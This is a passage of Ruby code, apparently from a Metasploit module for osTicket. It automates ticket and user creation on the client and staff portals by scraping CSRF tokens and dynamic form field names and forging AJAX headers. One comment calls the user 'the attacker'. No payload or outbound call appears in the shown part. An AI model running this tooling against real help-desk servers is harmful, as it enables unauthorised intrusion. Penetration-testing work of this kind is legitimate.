      vprint_status("detect_open_form_fields: topicId=#{topic_id}")
      topic_id
    end

    # Fetches the dynamic ticket-creation form fields for a given help topic.
    #
    # When a user picks a help topic on open.php, the browser fires an AJAX
    # request to ajax.php/form/help-topic/{id} which returns JSON containing
    # an "html" key with the rendered form fields (subject input + message
    # textarea, each named with a dynamic hex hash). This method replicates
    # that browser-side call so we can extract the actual field names.
    #
    # @param base_uri [String] base path to osTicket
    # @param topic_id [String] help topic ID (from detect_open_form_fields)
    # @param cookies  [String] session cookies
    # @return [Array] [subject_field_name, message_field_name] or [nil, nil]
    def fetch_topic_form_fields(base_uri, topic_id, cookies)
      ajax_uri = normalize_uri(base_uri, 'ajax.php', 'form', 'help-topic', topic_id.to_s)
      vprint_status("fetch_topic_form_fields: GET #{ajax_uri}")

      proto = datastore['SSL'] ? 'https' : 'http'
      referer = "#{proto}://#{rhost}:#{rport}#{normalize_uri(base_uri, 'open.php')}"

      res = send_request_cgi(
        'method' => 'GET',
        'uri' => ajax_uri,
        'cookie' => cookies,
        'headers' => {
          'X-Requested-With' => 'XMLHttpRequest',
          'Referer' => referer
        }
      )
      unless res&.code == 200
        vprint_error("fetch_topic_form_fields: AJAX request failed (code=#{res&.code})")
        return [nil, nil]
      end

      begin
        data = JSON.parse(res.body)
      rescue JSON::ParserError => e
        vprint_error("fetch_topic_form_fields: JSON parse error: #{e}")
        return [nil, nil]
      end

      form_html = data['html'].to_s
      if form_html.empty?
        vprint_error('fetch_topic_form_fields: Empty html in AJAX response')
        return [nil, nil]
      end

      doc = Nokogiri::HTML(form_html)

      subject_field = nil
      doc.search('input[@type="text"]').each do |input|
        name = input['name'].to_s
        if name.match?(/\A[a-f0-9]{10,}\z/)
          subject_field = name
          break
        end
      end

      message_field = nil
      doc.search('textarea').each do |ta|
        name = ta['name'].to_s
        if name.match?(/\A[a-f0-9]{10,}\z/)
          message_field = name
          break
        end
      end

      vprint_status("fetch_topic_form_fields: subject=#{subject_field.inspect}, message=#{message_field.inspect}")
      [subject_field, message_field]
    end

    # Fetches the visible ticket number (e.g. 284220 from #284220) from a client ticket page.
    #
    # @param base_uri  [String] base path to osTicket
    # @param ticket_id [String] internal ticket ID
    # @param cookies   [String] session cookies
    # @return [String, nil] ticket number or nil
    def fetch_ticket_number(base_uri, ticket_id, cookies)
      tickets_uri = normalize_uri(base_uri, 'tickets.php')
      vprint_status("fetch_ticket_number: GET #{tickets_uri}?id=#{ticket_id}")
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => tickets_uri,
        'cookie' => cookies,
        'vars_get' => { 'id' => ticket_id }
      )
      unless res&.code == 200
        vprint_warning("fetch_ticket_number: Could not load ticket page (code=#{res&.code})")
        return nil
      end

      match = res.body.match(%r{<small>#(\d+)</small>})
      if match
        vprint_good("fetch_ticket_number: Ticket number=##{match[1]}")
        return match[1]
      end

      vprint_warning('fetch_ticket_number: Could not parse ticket number from page')
      nil
    end

    # Creates a new ticket via the client portal (open.php).
    # Returns the internal ticket ID and visible ticket number on success.
    #
    # @param base_uri [String] base path to osTicket
    # @param cookies  [String] session cookies (client portal)
    # @param subject  [String] ticket subject line
    # @param message  [String] ticket message body
    # @return [Array] [ticket_id, ticket_number] or [nil, nil] on failure
    def create_ticket(base_uri, cookies, subject, message)
      open_uri = normalize_uri(base_uri, 'open.php')
      vprint_status("create_ticket: GET #{open_uri}")

      res = send_request_cgi('method' => 'GET', 'uri' => open_uri, 'cookie' => cookies)
      unless res&.code == 200
        vprint_error("create_ticket: GET open.php failed (code=#{res&.code})")
        return [nil, nil]
      end

      csrf = extract_csrf_token(res.body)
      # Fallback: meta csrf_token tag used on some osTicket builds
      csrf ||= res.body.match(/<meta\s+name="csrf_token"\s+content="([^"]+)"/i)&.[](1)
      unless csrf
        vprint_error('create_ticket: No CSRF token found on open.php')
        return [nil, nil]
      end

      # Grab updated session cookies from the open.php response before any AJAX call
      session_cookies = res.get_cookies
      session_cookies = cookies if session_cookies.empty?

      # Static HTML only has the topicId select; subject/message fields are
      # injected via ajax.php/form/help-topic/{id} when a topic is chosen.
      topic_id = detect_open_form_fields(res.body)
      subject_field, message_field = fetch_topic_form_fields(base_uri, topic_id, session_cookies)
      unless subject_field && message_field
        vprint_error('create_ticket: Could not detect form field names from topic AJAX response')
        return [nil, nil]
      end

      vprint_status("create_ticket: POST #{open_uri} (topicId=#{topic_id})")
      res = send_request_cgi(
        'method' => 'POST',
        'uri' => open_uri,
        'cookie' => session_cookies,
        'vars_post' => {
          '__CSRFToken__' => csrf,
          'a' => 'open',
          'topicId' => topic_id,
          subject_field => subject,
          message_field => message,
          'draft_id' => ''
        }
      )
      unless res
        vprint_error('create_ticket: No response from POST open.php (nil)')
        return [nil, nil]
      end
      vprint_status("create_ticket: POST response code=#{res.code}")

      new_cookies = res.get_cookies
      new_cookies = session_cookies if new_cookies.empty?

      if res.code == 302
        location = res.headers['Location'].to_s
        ticket_id = location.match(/tickets\.php\?id=(\d+)/i)&.[](1)
        unless ticket_id
          vprint_error("create_ticket: Cannot parse ticket ID from Location header: #{location}")
          return [nil, nil]
        end
        vprint_good("create_ticket: Ticket created, internal ID=#{ticket_id}")
        ticket_number = fetch_ticket_number(base_uri, ticket_id, new_cookies)
        return [ticket_id, ticket_number]
      end

      # Some installs return 200 with success notice and a link in the body
      if res.code == 200 && res.body.include?('ticket request created')
        id_match = res.body.match(/tickets\.php\?id=(\d+)/)
        if id_match
          ticket_id = id_match[1]
          ticket_number = fetch_ticket_number(base_uri, ticket_id, new_cookies)
          return [ticket_id, ticket_number]
        end
      end

      vprint_error("create_ticket: Unexpected response (code=#{res.code})")
      [nil, nil]
    end

    # -------------------------------------------------------------------------
    # SCP portal - ticket creation helpers
    # -------------------------------------------------------------------------

    # Fetches static form fields from the SCP new-ticket page.
    #
    # GET {prefix}/tickets.php?a=open - extracts CSRF token and the first
    # non-empty option values for topicId, deptId, and slaId selects.
    #
    # @param base_uri [String] base path to osTicket
    # @param prefix   [String] portal prefix ('/scp')
    # @param cookies  [String] session cookies
    # @return [Hash, nil] {csrf:, topic_id:, dept_id:, sla_id:, session_cookies:} or nil
    def fetch_open_form_fields_scp(base_uri, prefix, cookies)
      open_uri = normalize_uri(base_uri, prefix, 'tickets.php')
      vprint_status("fetch_open_form_fields_scp: GET #{open_uri}?a=open")

      res = send_request_cgi(
        'method' => 'GET',
        'uri' => open_uri,
        'cookie' => cookies,
        'vars_get' => { 'a' => 'open' }
      )
      unless res&.code == 200
        vprint_error("fetch_open_form_fields_scp: failed (code=#{res&.code})")
        return nil
      end

      doc = Nokogiri::HTML(res.body)

      csrf = doc.at('input[@name="__CSRFToken__"]')&.[]('value') ||
             doc.at('meta[@name="csrf_token"]')&.[]('content')
      unless csrf
        vprint_error('fetch_open_form_fields_scp: No CSRF token found')
        return nil
      end

      first_option = lambda { |name|
        doc.at("select[@name=\"#{name}\"]")
           &.search('option')
           &.find { |o| !o['value'].to_s.strip.empty? }
           &.[]('value')
      }

      topic_id = first_option.call('topicId') || '1'
      dept_id = first_option.call('deptId') || '0'
      sla_id = first_option.call('slaId') || '0'

      vprint_status("fetch_open_form_fields_scp: csrf=#{csrf[0, 8]}... topicId=#{topic_id} deptId=#{dept_id} slaId=#{sla_id}")
      {
        csrf: csrf,
        topic_id: topic_id,
        dept_id: dept_id,
        sla_id: sla_id,
        session_cookies: res.get_cookies.empty? ? cookies : res.get_cookies
      }
    end

    # Fetches dynamic subject/message field names for the SCP ticket form.
    #
    # Identical logic to fetch_topic_form_fields but sets the Referer to the
    # SCP new-ticket page (tickets.php?a=open) instead of open.php, which is
    # required to pass osTicket's AJAX Referer validation.
    #
    # @param base_uri [String] base path to osTicket
    # @param prefix   [String] portal prefix ('/scp')
    # @param topic_id [String] help topic ID
    # @param cookies  [String] session cookies
    # @return [Array] [subject_field_name, message_field_name] or [nil, nil]
    def fetch_topic_form_fields_scp(base_uri, prefix, topic_id, cookies)
      ajax_uri = normalize_uri(base_uri, prefix, 'ajax.php', 'form', 'help-topic', topic_id.to_s)
      vprint_status("fetch_topic_form_fields_scp: GET #{ajax_uri}")

      proto = datastore['SSL'] ? 'https' : 'http'
      referer = "#{proto}://#{rhost}:#{rport}#{normalize_uri(base_uri, prefix, 'tickets.php')}?a=open"

      res = send_request_cgi(
        'method' => 'GET',
        'uri' => ajax_uri,
        'cookie' => cookies,
        'headers' => {
          'X-Requested-With' => 'XMLHttpRequest',
          'Referer' => referer
        }
      )
      unless res&.code == 200
        vprint_error("fetch_topic_form_fields_scp: AJAX failed (code=#{res&.code})")
        return [nil, nil]
      end

      begin
        data = JSON.parse(res.body)
      rescue JSON::ParserError => e
        vprint_error("fetch_topic_form_fields_scp: JSON parse error: #{e}")
        return [nil, nil]
      end

      form_html = data['html'].to_s
      if form_html.empty?
        vprint_error('fetch_topic_form_fields_scp: Empty html in AJAX response')
        return [nil, nil]
      end

      doc = Nokogiri::HTML(form_html)

      subject_field = doc.search('input[@type="text"]')
                         .map { |i| i['name'].to_s }
                         .find { |n| n.match?(/\A[a-f0-9]{10,}\z/) }

      message_field = doc.search('textarea')
                         .map { |t| t['name'].to_s }
                         .find { |n| n.match?(/\A[a-f0-9]{10,}\z/) }

      vprint_status("fetch_topic_form_fields_scp: subject=#{subject_field.inspect} message=#{message_field.inspect}")
      [subject_field, message_field]
    end

    # Looks up an existing SCP user by email via the staff typeahead endpoint.
    #
    # @param base_uri [String] base path to osTicket
    # @param prefix   [String] portal prefix ('/scp')
    # @param cookies  [String] session cookies
    # @param email    [String] email address to search
    # @return [String, nil] internal user ID or nil if not found
    def lookup_user_id_scp(base_uri, prefix, cookies, email)
      ajax_uri = normalize_uri(base_uri, prefix, 'ajax.php', 'users', 'local')
      vprint_status("lookup_user_id_scp: GET #{ajax_uri}?q=#{email}")

      proto = datastore['SSL'] ? 'https' : 'http'
      referer = "#{proto}://#{rhost}:#{rport}#{normalize_uri(base_uri, prefix, 'tickets.php')}?a=open"

      res = send_request_cgi(
        'method' => 'GET',
        'uri' => ajax_uri,
        'cookie' => cookies,
        'vars_get' => { 'q' => email },
        'headers' => {
          'X-Requested-With' => 'XMLHttpRequest',
          'Referer' => referer
        }
      )
      unless res&.code == 200
        vprint_error("lookup_user_id_scp: request failed (code=#{res&.code})")
        return nil
      end

      begin
        users = JSON.parse(res.body)
      rescue JSON::ParserError => e
        vprint_error("lookup_user_id_scp: JSON parse error: #{e}")
        return nil
      end

      return nil unless users.is_a?(Array) && !users.empty?

      user_id = users.first['id'].to_s
      vprint_good("lookup_user_id_scp: found user id=#{user_id}")
      user_id
    end

    # Fetches the dynamic field names from the SCP user creation form.
    #
    # GET {prefix}/ajax.php/users/lookup/form returns an HTML fragment with
    # hex-hash field names for email (type="email") and full name (type="text").
    #
    # @param base_uri [String] base path to osTicket
    # @param prefix   [String] portal prefix ('/scp')
    # @param cookies  [String] session cookies
    # @return [Array] [email_field_name, fullname_field_name] or [nil, nil]
    def fetch_user_form_fields_scp(base_uri, prefix, cookies)
      ajax_uri = normalize_uri(base_uri, prefix, 'ajax.php', 'users', 'lookup', 'form')
      vprint_status("fetch_user_form_fields_scp: GET #{ajax_uri}")

      proto = datastore['SSL'] ? 'https' : 'http'
      referer = "#{proto}://#{rhost}:#{rport}#{normalize_uri(base_uri, prefix, 'tickets.php')}?a=open"

      res = send_request_cgi(
        'method' => 'GET',
        'uri' => ajax_uri,
        'cookie' => cookies,
        'headers' => {
          'X-Requested-With' => 'XMLHttpRequest',
          'Referer' => referer
        }
      )
      unless res&.code == 200
        vprint_error("fetch_user_form_fields_scp: failed (code=#{res&.code})")
        return [nil, nil]
      end

      doc = Nokogiri::HTML(res.body)

      email_field = doc.search('input[@type="email"]')
                       .map { |i| i['name'].to_s }
                       .find { |n| n.match?(/\A[a-f0-9]{10,}\z/) }

      name_field = doc.search('input[@type="text"]')
                      .map { |i| i['name'].to_s }
                      .find { |n| n.match?(/\A[a-f0-9]{10,}\z/) }

      vprint_status("fetch_user_form_fields_scp: email_field=#{email_field.inspect} name_field=#{name_field.inspect}")
      [email_field, name_field]
    end

    # Ensures a ticket owner user exists in osTicket via the SCP portal.
    #
    # Looks up the user by email first. If not found, fetches the user creation
    # form field names and POSTs to create the user, then looks up again to
    # retrieve the internal ID.
    #
    # NOTE: The email and fullname values come from SCP_TICKET_EMAIL /
    # SCP_TICKET_NAME datastore options - they are NOT the attacker's login
    # credentials and are only used here to assign ownership of the created
    # ticket.
    #
    # @param base_uri [String] base path to osTicket
    # @param prefix   [String] portal prefix ('/scp')
    # @param cookies  [String] session cookies
    # @param csrf     [String] CSRF token from the SCP ticket form
    # @param email    [String] ticket owner email (SCP_TICKET_EMAIL)
    # @param fullname [String] ticket owner full name (SCP_TICKET_NAME)
    # @return [String, nil] internal user ID or nil on failure
    def ensure_user_scp(base_uri, prefix, cookies, csrf, email, fullname)
      user_id = lookup_user_id_scp(base_uri, prefix, cookies, email)
      return user_id if user_id

      vprint_status("ensure_user_scp: user not found, attempting to create (#{email})")

      email_field, name_field = fetch_user_form_fields_scp(base_uri, prefix, cookies)
      unless email_field && name_field
        vprint_error('ensure_user_scp: Could not extract user form field names')
        return nil
      end

      ajax_uri = normalize_uri(base_uri, prefix, 'ajax.php', 'users', 'lookup', 'form')
      proto = datastore['SSL'] ? 'https' : 'http'
      referer = "#{proto}://#{rhost}:#{rport}#{normalize_uri(base_uri, prefix, 'tickets.php')}?a=open"

      send_request_cgi(
        'method' => 'POST',
        'uri' => ajax_uri,
        'cookie' => cookies,
        'vars_post' => {
          email_field => email,
          name_field => fullname,
          'undefined' => 'Add User'
        },
        'headers' => {
          'X-Requested-With' => 'XMLHttpRequest',
          'X-CSRFToken' => csrf,
          'Referer' => referer
        }
      )

      user_id = lookup_user_id_scp(base_uri, prefix, cookies, email)
      vprint_status("ensure_user_scp: post-create lookup id=#{user_id.inspect}")
      user_id
    end

    # Fetches the visible ticket number from the SCP ticket page.
    #
    # The SCP portal renders the ticket number as <title>Ticket #NNNNNN</title>,
    # unlike the client portal which uses <small>#NNNNNN</small>.
    #
    # @param base_uri  [String] base path to osTicket
    # @param prefix    [String] portal prefix ('/scp')
    # @param ticket_id [String] internal ticket ID
    # @param cookies   [String] session cookies
    # @return [String, nil] ticket number or nil
    def fetch_ticket_number_scp(base_uri, prefix, ticket_id, cookies)
      tickets_uri = normalize_uri(base_uri, prefix, 'tickets.php')
      vprint_status("fetch_ticket_number_scp: GET #{tickets_uri}?id=#{ticket_id}")

      res = send_request_cgi(
        'method' => 'GET',
        'uri' => tickets_uri,
        'cookie' => cookies,
        'vars_get' => { 'id' => ticket_id }
      )
      unless res&.code == 200
        vprint_warning("fetch_ticket_number_scp: Could not load ticket page (code=#{res&.code})")
        return nil
      end

      match = res.body.match(%r{<title>Ticket #(\d+)</title>}i)
      if match
        vprint_good("fetch_ticket_number_scp: Ticket number=##{match[1]}")
        return match[1]
      end

      vprint_warning('fetch_ticket_number_scp: Could not parse ticket number from page')
      nil
    end

    # Creates a new ticket via the SCP (staff) portal.
    #
    # The ticket is owned by the user identified by SCP_TICKET_EMAIL /
    # SCP_TICKET_NAME options, which default to user@msf.com / MSF User.
    # These options are ONLY consulted when ticket creation is triggered
    # through a valid SCP portal login.
    #
    # Flow:
    #   1. fetch_open_form_fields_scp   - CSRF, topicId, deptId, slaId
    #   2. fetch_topic_form_fields_scp  - subject/message hex-hash field names
    #   3. ensure_user_scp              - lookup or create ticket owner, get user_id
    #   4. POST tickets.php?a=open      - create ticket, follow 302 for ticket_id
    #   5. fetch_ticket_number_scp      - resolve visible ticket number
    #
    # @param base_uri [String] base path to osTicket
    # @param prefix   [String] portal prefix ('/scp')
    # @param cookies  [String] session cookies
    # @param subject  [String] ticket subject
    # @param message  [String] ticket message body
    # @return [Array] [ticket_id, ticket_number] or [nil, nil] on failure
    def create_ticket_scp(base_uri, prefix, cookies, subject, message)
      fields = fetch_open_form_fields_scp(base_uri, prefix, cookies)
      return [nil, nil] unless fields

      session_cookies = fields[:session_cookies]

      subject_field, message_field = fetch_topic_form_fields_scp(
        base_uri, prefix, fields[:topic_id], session_cookies
      )
      unless subject_field && message_field
        vprint_error('create_ticket_scp: Could not detect subject/message field names')
        return [nil, nil]
      end

      ticket_email = datastore['SCP_TICKET_EMAIL'].to_s
      ticket_fullname = datastore['SCP_TICKET_NAME'].to_s

      user_id = ensure_user_scp(
        base_uri, prefix, session_cookies, fields[:csrf],
        ticket_email, ticket_fullname
      )
      unless user_id
        vprint_error('create_ticket_scp: Could not resolve ticket owner user ID')
        return [nil, nil]
      end

      open_uri = normalize_uri(base_uri, prefix, 'tickets.php')
      vprint_status("create_ticket_scp: POST #{open_uri}?a=open (user_id=#{user_id})")

      res = send_request_cgi(
        'method' => 'POST',
        'uri' => open_uri,
        'cookie' => session_cookies,
        'vars_post' => {
          '__CSRFToken__' => fields[:csrf],
          'do' => 'create',
          'a' => 'open',
          'email' => ticket_email,
          'name' => user_id,
          'reply-to' => 'all',
          'source' => 'Web',
          'topicId' => fields[:topic_id],
          'deptId' => fields[:dept_id],
          'slaId' => fields[:sla_id],
          'duedate' => '',
          'assignId' => '0',
          subject_field => subject,
          message_field => message,
          'cannedResp' => '0',
          'append' => '1',
          'response' => '',
          'statusId' => '1',
          'signature' => 'none',
          'note' => '',
          'draft_id' => ''
        }
      )
      unless res
        vprint_error('create_ticket_scp: No response from POST (nil)')
        return [nil, nil]
      end
      vprint_status("create_ticket_scp: POST response code=#{res.code}")

      unless res.code == 302
        vprint_error("create_ticket_scp: Expected 302 redirect, got #{res.code}")
        return [nil, nil]
      end

      location = res.headers['Location'].to_s
      ticket_id = location.match(/tickets\.php\?id=(\d+)/i)&.[](1)
      unless ticket_id
        vprint_error("create_ticket_scp: Cannot parse ticket ID from Location: #{location}")
        return [nil, nil]
      end

      new_cookies = res.get_cookies.empty? ? session_cookies : res.get_cookies
      vprint_good("create_ticket_scp: Ticket created, internal ID=#{ticket_id}")

      ticket_number = fetch_ticket_number_scp(base_uri, prefix, ticket_id, new_cookies)
      [ticket_id, ticket_number]
    end

    # Detects the reply textarea field name from the ticket page HTML.
    #
    # Uses Nokogiri DOM parsing for reliable attribute extraction.
    # osTicket sets id="response" (SCP) or id="message" (client) on the reply
    # textarea and gives it a dynamic hex-hash name attribute.
    #
    # @param html   [String] ticket page HTML
    # @param prefix [String] portal prefix ('/scp' or '')
    # @return [String] textarea field name
    def detect_reply_textarea(html, prefix)
      doc = Nokogiri::HTML(html)

      # Try the well-known ids first
      ta = doc.at('textarea[@id="response"]') || doc.at('textarea[@id="message"]')
      return ta['name'] if ta && !ta['name'].to_s.empty?

      # Fallback: any textarea with a hex-hash name (osTicket dynamic field naming)
      doc.search('textarea').each do |t|
        name = t['name'].to_s
        return name if name.match?(/\A[a-f0-9]{10,}\z/)
      end

      prefix == '/scp' ? 'response' : 'message'
    end
  end
end
